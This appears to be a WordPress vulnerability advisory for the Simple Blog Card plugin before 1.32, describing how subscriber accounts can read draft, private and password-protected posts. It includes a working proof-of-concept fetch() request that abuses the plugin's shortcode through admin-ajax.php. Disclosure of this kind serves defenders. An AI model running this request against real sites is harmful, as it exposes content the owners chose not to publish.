## WordPress Plugin Vulnerabilities

# Simple Blog Card < 1.32 - Subscriber+ Arbitrary Post Access

### Description

The plugin does not ensure that posts to be displayed via a shortcode are public, allowing any authenticated users, such as subscriber, to retrieve arbitrary post title and their content such as draft, private and password protected ones

### Proof of Concept

Run the below command in the developer console of the web browser while being on the blog as a subscriber user
fetch("/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"method": "POST",
"body": "action=parse-media-shortcode&shortcode=[simpleblogcard url='?p=53']",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
53 being the ID of a draft/private/password protected post
